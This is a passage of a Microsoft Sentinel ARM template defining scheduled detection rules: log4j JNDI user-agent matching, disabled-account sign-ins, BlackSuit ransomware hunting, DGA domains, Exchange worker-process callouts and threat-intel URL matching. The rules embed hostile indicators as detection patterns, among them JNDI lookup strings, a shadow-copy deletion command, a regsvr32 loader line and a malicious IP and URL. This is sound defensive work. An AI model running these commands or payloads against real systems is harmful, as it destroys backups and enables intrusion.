        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/63a76518-720d-42f3-8e26-f5793f94fd78')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "User agent search for log4j exploitation attempt",
          "description": "This query uses various log sources having user agent data to look for log4j CVE-2021-44228 exploitation attempt based on user agent pattern. Log4j is an open-source Apache logging library that is used in \n many Java-based applications. The regex and the string matching look for the most common attacks. This might not be comprehensive to detect every possible user agent variation.\n Reference: https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/",
          "severity": "High",
          "enabled": true,
          "query": "let UserAgentString = dynamic ([\"${jndi:ldap:/\", \"${jndi:rmi:/\", \"${jndi:ldaps:/\", \"${jndi:dns:/\", \"${jndi:iiop:/\",\"${jndi:\",\"${jndi:nds:/\",\"${jndi:corba/\"]);\nlet UARegex = @'(\\\\$|%24)(\\\\{|%7B)([^jJ]*[jJ])([^nN]*[nN])([^dD]*[dD])([^iI]*[iI])(:|%3A|\\\\$|%24|}|%7D)';\n(union isfuzzy=true\n(OfficeActivity\n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = ClientIP, Account = UserId, Type, Operation\n| extend timestamp = StartTime, AccountCustomEntity = Account, IPCustomEntity = SourceIP\n),\n(AzureDiagnostics\n| where Category in (\"FrontdoorWebApplicationFirewallLog\", \"FrontdoorAccessLog\", \"ApplicationGatewayFirewallLog\", \"ApplicationGatewayAccessLog\")\n| where userAgent_s has_any (UserAgentString) or userAgent_s matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent = userAgent_s, SourceIP = clientIP_s, Type, host_s, requestUri_s, httpStatus_d\n| extend timestamp = StartTime, IPCustomEntity = SourceIP, UrlCustomEntity = requestUri_s\n),\n(\nW3CIISLog\n| where (csUserAgent has_any (UserAgentString) or csUserAgent matches regex UARegex) and csUserAgent !contains \"nessus.org\"\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent = csUserAgent, SourceIP = cIP, Account = csUserName, Type, sSiteName, csMethod, csUriStem\n| extend timestamp = StartTime, AccountCustomEntity = Account, IPCustomEntity = SourceIP, UrlCustomEntity = csUriStem\n),\n(\nAWSCloudTrail\n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = SourceIpAddress, Account = UserIdentityUserName, Type, EventName\n| extend timestamp = StartTime, AccountCustomEntity = Account, IPCustomEntity = SourceIP\n),\n(SigninLogs\n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = IPAddress, Account = UserPrincipalName, Type, Operation = OperationName, tostring(LocationDetails), tostring(DeviceDetail),    AppDisplayName, ClientAppUsed\n| extend timestamp = StartTime, AccountCustomEntity = Account, IPCustomEntity = SourceIP\n),\n(AADNonInteractiveUserSignInLogs \n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = IPAddress, Account = UserPrincipalName, Type, Operation = OperationName, tostring(LocationDetails), tostring(DeviceDetail), AppDisplayName, ClientAppUsed\n| extend timestamp = StartTime, AccountCustomEntity = Account, IPCustomEntity = SourceIP\n),\n(imWebSessions\n| where HttpUserAgent has_any (UserAgentString) or HttpUserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by HttpUserAgent, SourceIP = SrcIpAddr, DstIpAddr, Account = SrcUsername, URL, Type\n| extend timestamp = StartTime, AccountCustomEntity = Account, IPCustomEntity = SourceIP, UrlCustomEntity = URL\n),\n(imNetworkSession\n| where HttpUserAgent has_any (UserAgentString) or HttpUserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by HttpUserAgent, SourceIP = SrcIpAddr, DstIpAddr, Account = SrcUsername, Type, Url\n| extend timestamp = StartTime, AccountCustomEntity = Account, IPCustomEntity = SourceIP, UrlCustomEntity = Url\n)\n)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "UrlCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/6d245962-1162-4e5d-be64-f19d864d510b')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/6d245962-1162-4e5d-be64-f19d864d510b')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Attempts to sign in to disabled accounts",
          "description": "Identifies failed attempts to sign in to disabled accounts across multiple Azure Applications.\nDefault threshold for Azure Applications attempted to sign in to is 3.\nReferences: https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-sign-ins-error-codes\n50057 - User account is disabled. The account has been disabled by an administrator.",
          "severity": "Medium",
          "enabled": true,
          "query": "let threshold = 3;\nlet aadFunc = (tableName:string){\ntable(tableName)\n| where ResultType == \"50057\"\n| where ResultDescription =~ \"User account is disabled. The account has been disabled by an administrator.\"\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), applicationCount = dcount(AppDisplayName),\napplicationSet = make_set(AppDisplayName), count() by UserPrincipalName, IPAddress, Type\n | where Type  !contains \"AADNonInteractiveUserSignInLogs\" //Non interactive sign create a lot of noise, if employee goes on LOA device is plugged in. We would only want to see interactive sign ons - DanneF\n| where applicationCount >= threshold\n| extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\n};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nunion isfuzzy=true aadSignin, aadNonInt\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "75ea5c39-93e5-489b-b1e1-68fa6c9d2d04",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/d71b7015-fe95-41b6-9206-ce67b68dbfee')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/d71b7015-fe95-41b6-9206-ce67b68dbfee')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BlackSuit Ransomware Hunt",
          "description": "This hunting rule detects indicators of compromise (IOCs) related to the BlackSuit ransomware, including file hashes, suspicious file names, and known malicious command-line executions.",
          "severity": "Medium",
          "enabled": true,
          "query": "// Hunting for file hashes related to BlackSuit ransomware - Created 10/2/24 Amayor\nDeviceFileEvents\n| where TimeGenerated >= ago(15d)\n| where SHA256 in (\"03f096d92fb3f66510d9c517e47549c45c957787ae80f725ad3cdf8cae28b9a5\",\n                   \"2f76005ae34b71f2754ac52a39d743843d168187e6cd1674b8b05a47953d3ae5\",\n                   \"d84088499e2a8dfc94f41022642c9e0054df3e21b53fba15db7370fba43b6eed\",\n                   \"fed091f2c6942d0c5b102fd0a1cbc9c45abfa99f409966f182ffd5afa12a6aa3\",\n                   \"3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71\")\n| project TimeGenerated, DeviceName, FileName, FolderPath, SHA256\n// Hunting for file names associated with BlackSuit ransomware\n| union (\n    DeviceFileEvents\n    | where TimeGenerated >= ago(15d)\n    | where FileName in (\"mhm.dll\", \"mhm.exe\", \"etstset.exe\", \"tmp00000008\", \"tmp00000009\")\n    // Exclude common system binaries that could generate noise\n    | project TimeGenerated, DeviceName, FileName, FolderPath, SHA256\n)\n// Hunting for process lineage associated with known behavior, including specific suspicious commands\n| union (\n    DeviceProcessEvents\n    | where TimeGenerated >= ago(15d)\n    // Specific suspicious commands \n    | where (ProcessCommandLine has \"cmd.exe /c regsvr32.exe /n /i:\\\"-id \\\\\\\"AoTrM0OxyEcJfHMwAR4AhK39Uocvq6Eh\\\\\\\" -ep 50\\\" \\\"CSIDL_PROFILE\\\\mhm.dll\\\"\" \n        or ProcessCommandLine has \"cmd.exe /c vssadmin delete shadows /all /quiet\")\n    // Exclude irrelevant instances of common system binaries\n    | where not(FileName in (\"cmd.exe\", \"net.exe\", \"net1.exe\", \"msconfig.exe\")) \n    // General behaviors\n    | where ProcessCommandLine contains \"regsvr32.exe\" \n        or ProcessCommandLine contains \"vssadmin delete shadows\"\n        or ProcessCommandLine contains \"CSIDL_PROFILE\\\\mhm.dll\"\n        or ProcessCommandLine contains \"CSIDL_WINDOWS\\\\temp\\\\mhm.dll\"\n    | project TimeGenerated, DeviceName, InitiatingProcessFileName, ProcessCommandLine\n)\n// Hunt for specific network indicators\n| union (\n    DeviceNetworkEvents\n    | where TimeGenerated >= ago(15d)\n    | where RemoteIP in (\"88.214.26.31\")\n        or RemoteUrl in (\"http://88.214.26.31/salarying/zips\")\n    | project TimeGenerated, DeviceName, RemoteIP, RemoteUrl, RemotePort\n)\n// Hunting for tools used in attacks\n| union (\n    DeviceFileEvents\n    | where TimeGenerated >= ago(15d)\n    | where FileName in (\"FastStone Capture\", \"Remadmin\", \"netscan.exe\", \"PsExec\")\n    | project TimeGenerated, DeviceName, FileName, FolderPath, SHA256\n)\n\n",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT15H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/e855b4d2-c7dd-4971-855f-9aafd41f479e')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/e855b4d2-c7dd-4971-855f-9aafd41f479e')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Potential communication with a Domain Generation Algorithm (DGA) based hostname (ASIM Web Session schema)",
          "description": "This rule identifies communication with hosts that have a domain name that might have been generated by a Domain Generation Algorithm (DGA).\nDGAs are used by malware to generate rendezvous points that are difficult to predict in advance. This detection uses the top 1 million domain names to build a model of what normal domains look like nad uses the model to identify domains that may have been randomly generated by an algorithm. You can modify the triThreshold and dgaLengthThreshold query parameters to change Analytic Rule sensitivity. The higher the numbers, the less noisy the rule is.\n This analytic rule uses [ASIM](https://aka.ms/AboutASIM) and supports any built-in or custom source that supports the ASIM WebSession schema (ASIM WebSession Schema)",
          "severity": "Medium",
          "enabled": true,
          "query": "let triThreshold = 500;\nlet querystarttime = 6h;\nlet dgaLengthThreshold = 8;\n// fetch the cisco umbrella top 1M domains\nlet top1M =  (externaldata (Position:int, Domain:string)   [@\"http://s3-us-west-1.amazonaws.com/umbrella-static/top-1m.csv.zip\"]  with (format=\"csv\", zipPattern=\"*.csv\"));\n// extract tri grams that are above our threshold - i.e. are common\nlet triBaseline =   top1M\n  | extend Domain = tolower(extract(\"([^.]*).{0,7}$\", 1, Domain))\n  | extend AllTriGrams = array_concat(extract_all(\"(...)\", Domain), extract_all(\"(...)\", substring(Domain, 1)), extract_all(\"(...)\", substring(Domain, 2)))\n  | mvexpand Trigram=AllTriGrams to typeof(string)\n  | summarize triCount=count() by Trigram\n  | sort by triCount desc\n  | where triCount > triThreshold\n  | distinct Trigram;\n// collect domain information from common security log, filter and extract the DGA candidate and its trigrams\nlet allDataSummarized =  _Im_WebSession\n| where isnotempty(Url)\n| extend Name = tolower(tostring(parse_url(Url)[\"Host\"]))\n| summarize NameCount=count() by Name\n| where Name has \".\"\n| where Name !endswith \".home\" and Name !endswith \".lan\"\n// extract DGA candidate\n| extend DGADomain = extract(\"([^.]*).{0,7}$\", 1, Name)\n| where strlen(DGADomain) > dgaLengthThreshold\n// throw out domains with number in them\n| where DGADomain matches regex \"^[A-Za-z]{0,}$\"\n// extract the tri grams from summarized data\n| extend AllTriGrams = array_concat(extract_all(\"(...)\", DGADomain), extract_all(\"(...)\", substring(DGADomain, 1)), extract_all(\"(...)\", substring(DGADomain, 2)));\n// throw out domains that have repeating tri's and/or >=3 repeating letters\nlet nonRepeatingTris =  allDataSummarized\n| join kind=leftanti\n(\n    allDataSummarized\n    | mvexpand AllTriGrams\n    | summarize count() by tostring(AllTriGrams), DGADomain\n    | where count_ > 1\n    | distinct DGADomain\n)\non DGADomain;\n// find domains that do not have a common tri in the baseline\nlet dataWithRareTris =  nonRepeatingTris\n| join kind=leftanti\n(\n    nonRepeatingTris\n    | mvexpand AllTriGrams\n    | extend Trigram = tostring(AllTriGrams)\n    | distinct Trigram, DGADomain\n    | join kind=inner\n    (\n        triBaseline\n    )\n    on Trigram\n    | distinct DGADomain\n)\non DGADomain;\ndataWithRareTris\n// join DGAs back on connection data\n| join kind=inner\n(\n    _Im_WebSession\n    | where isnotempty(Url)\n    | extend Url = tolower(Url)\n    | summarize arg_max(TimeGenerated, EventVendor,  SrcIpAddr) by Url\n    | extend Name=tostring(parse_url(Url)[\"Host\"])\n    | summarize StartTime=min(TimeGenerated), EndTime=max(TimeGenerated) by Name, SrcIpAddr, Url\n)\non Name\n| project StartTime, EndTime, Name, DGADomain, SrcIpAddr, Url, NameCount\n",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1568"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "9176b18f-a946-42c6-a2f6-0f6d17cd6a8a",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "Potential communication from {{SrcIpAddr}} with a Domain Generation Algorithm (DGA) based host {{Name}}",
            "alertDescriptionFormat": "A client with address {{SrcIpAddr}} communicated with host {{Name}} that have a domain name that might have been generated by a Domain Generation Algorithm (DGA), identified by the pattern {{DGADomain}}. DGAs are used by malware to generate rendezvous points that are difficult to predict in advance. This detection uses the top 1 million domain names to build a model of what normal domains look like and uses the model to identify domains that may have been randomly generated by an algorithm."
          },
          "customDetails": {
            "DGAPattern": "DGADomain",
            "NameCount": "NameCount"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.5"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/d2ab1529-be31-4660-abf9-838a63334bde')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/d2ab1529-be31-4660-abf9-838a63334bde')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Exchange Worker Process Making Remote Call",
          "description": "This query dynamically identifies Exchange servers and then looks for instances where the IIS worker process initiates a call out to a remote URL using either cmd.exe or powershell.exe.\nThis behaviour was described as post-compromise behaviour following exploitation of CVE-2022-41040 and CVE-2022-41082, this pattern of activity was use to download additional tools to the server. This suspicious activity is generic.",
          "severity": "Medium",
          "enabled": true,
          "query": "let suspiciousCmdLineKeywords = dynamic([\"http://\", \"https://\"]);\n// Identify exchange servers based on known paths\n// Summarize these to get a list of exchange server hostnames\nlet exchangeServers = W3CIISLog\n| where csUriStem has_any(\"/owa/\",\"/ews/\",\"/ecp/\",\"/autodiscover/\")\n// Only where successful, rule out failed scanning\n| where scStatus startswith \"2\"\n| summarize by Computer;\nDeviceProcessEvents\n| where DeviceName in~ (exchangeServers)\n// Where the IIS worker process initiated CMD or PowerShell\n| where InitiatingProcessParentFileName == \"w3wp.exe\"\n| where InitiatingProcessFileName has_any(\"cmd.exe\", \"powershell.exe\")\n// Where CMD or PowerShell command line included parameters associated with CVE-2022-41040/CVE-2022-41082 exploitation\n| where ProcessCommandLine has_any(suspiciousCmdLineKeywords)\n| project TimeGenerated, DeviceId, DeviceName, InitiatingProcessFileName, ProcessCommandLine, AccountDomain = InitiatingProcessAccountDomain, AccountName = InitiatingProcessAccountName\n| extend Account = strcat(AccountDomain, \"\\\\\", AccountName)\n| extend HostName = tostring(split(DeviceName, \".\")[0]), DomainIndex = toint(indexof(DeviceName, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(DeviceName, DomainIndex + 1), DeviceName)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1059"
          ],
          "subTechniques": [
            "T1059.003"
          ],
          "alertRuleTemplateName": "2c701f94-783c-4cd4-bc9b-3b3334976090",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Account"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountDomain"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/93d680ed-5c9b-4784-a9d7-39502ed1a5a1')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/93d680ed-5c9b-4784-a9d7-39502ed1a5a1')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "URL Added to Application from Unknown Domain",
          "description": "Detects a URL being added to an application where the domain is not one that is associated with the tenant.\n  The query uses domains seen in sign in logs to determine if the domain is associated with the tenant.\n  Applications associated with URLs not controlled by the organization can pose a security risk.\n  Ref: https://learn.microsoft.com/en-gb/entra/architecture/security-operations-applications#application-configuration-changes",
          "severity": "High",
          "enabled": true,
          "query": "let domains =\n  SigninLogs\n  | where ResultType == 0\n  | extend domain = split(UserPrincipalName, \"@\")[1]\n  | extend domain = tostring(split(UserPrincipalName, \"@\")[1])\n  | summarize by tolower(tostring(domain));\n  AuditLogs\n  | where Category =~ \"ApplicationManagement\"\n  | where Result =~ \"success\"\n  | where OperationName =~ 'Update Application'\n  | mv-expand TargetResources\n  | mv-expand TargetResources.modifiedProperties\n  | where TargetResources_modifiedProperties.displayName =~ \"AppAddress\"\n  | extend Key = tostring(TargetResources_modifiedProperties.displayName)\n  | extend NewValue = TargetResources_modifiedProperties.newValue\n  | extend OldValue = TargetResources_modifiedProperties.oldValue\n  | where isnotempty(Key) and isnotempty(NewValue)\n  | project-reorder Key, NewValue, OldValue\n  | extend NewUrls = extract_all('\"Address\":([^,]*)', tostring(NewValue))\n  | extend OldUrls = extract_all('\"Address\":([^,]*)', tostring(OldValue))\n  | extend AddedUrls = set_difference(NewUrls, OldUrls)\n  | where array_length(AddedUrls) > 0\n  | extend UserAgent = iif(tostring(AdditionalDetails[0].key) == \"User-Agent\", tostring(AdditionalDetails[0].value), \"\")\n  | extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n  | extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n  | extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n  | extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n  | extend InitiatingIPAddress = tostring(InitiatedBy.user.ipAddress)\n  | extend InitiatedBy = tostring(iff(isnotempty(InitiatingUserPrincipalName),InitiatingUserPrincipalName, InitiatingAppName))\n  | extend AppDisplayName = tostring(TargetResources.displayName)\n  | where isnotempty(AddedUrls)\n  | mv-expand AddedUrls\n  | extend AddedUrls = trim(@'\"', tostring(AddedUrls))\n  | extend Domain = extract(\"^(?:https?:\\\\/\\\\/)?(?:[^@\\\\/\\\\n]+@)?(?:www\\\\.)?([^:\\\\/?\\\\n]+)/\", 1, replace_string(tolower(AddedUrls), '\"', \"\"))\n  | where isnotempty(Domain)\n  | extend Domain = strcat(split(Domain, \".\")[-2], \".\", split(Domain, \".\")[-1])\n  | where Domain !in (domains)\n  | project-reorder TimeGenerated, AppDisplayName, AddedUrls, InitiatedBy, UserAgent, InitiatingIPAddress\n  | extend InitiatingAccountName = tostring(split(InitiatingUserPrincipalName, \"@\")[0]), InitiatingAccountUPNSuffix = tostring(split(InitiatingUserPrincipalName, \"@\")[1])\n",
          "queryFrequency": "PT2H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "017e095a-94d8-430c-a047-e51a11fb737b",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "InitiatingAppName"
                },
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "InitiatingAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "InitiatingAccountUPNSuffix"
                },
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIPAddress"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "AddedUrls"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/2f703c59-db5e-4642-9343-3e2419134766')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/2f703c59-db5e-4642-9343-3e2419134766')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI Map URL Entity to AuditLogs",
          "description": "This query identifies any URL indicators of compromise (IOCs) from threat intelligence (TI) by searching for matches in AuditLogs.",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet AuditEvents = materialize(AuditLogs\n  | where TimeGenerated >= ago(dt_lookBack)\n  // Extract the URL that is contained within the JSON data\n  | extend Url = extract(\"(http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\\\(\\\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+)\", 1,tostring(TargetResources))\n  | where isnotempty(Url)\n  | extend userPrincipalName = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n  | extend TargetResourceDisplayName = tostring(TargetResources[0].displayName)\n  | extend Audit_TimeGenerated = TimeGenerated);\nlet AuditUrls = AuditEvents | distinct Url = tolower(Url) | summarize make_list(Url);\nThreatIntelligenceIndicator\n| where isnotempty(Url)\n| where TimeGenerated >= ago(ioc_lookBack)\n| where tolower(Url) in (AuditUrls)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n| where Description !contains_cs \"State: inactive;\" and Description !contains_cs \"State: falsepos;\"\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (AuditEvents) on Url\n| where Audit_TimeGenerated < ExpirationDateTime\n| summarize Audit_TimeGenerated = arg_max(Audit_TimeGenerated, *) by IndicatorId, Url\n| project Audit_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore,\nOperationName, Identity, userPrincipalName, TargetResourceDisplayName, Url\n| extend AccountName = tostring(split(userPrincipalName, \"@\")[0]), AccountUPNSuffix = tostring(split(userPrincipalName, \"@\")[1])\n| extend HostName = tostring(split(TargetResourceDisplayName, \".\")[0]), DomainIndex = toint(indexof(TargetResourceDisplayName, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(TargetResourceDisplayName, DomainIndex + 1), TargetResourceDisplayName)\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
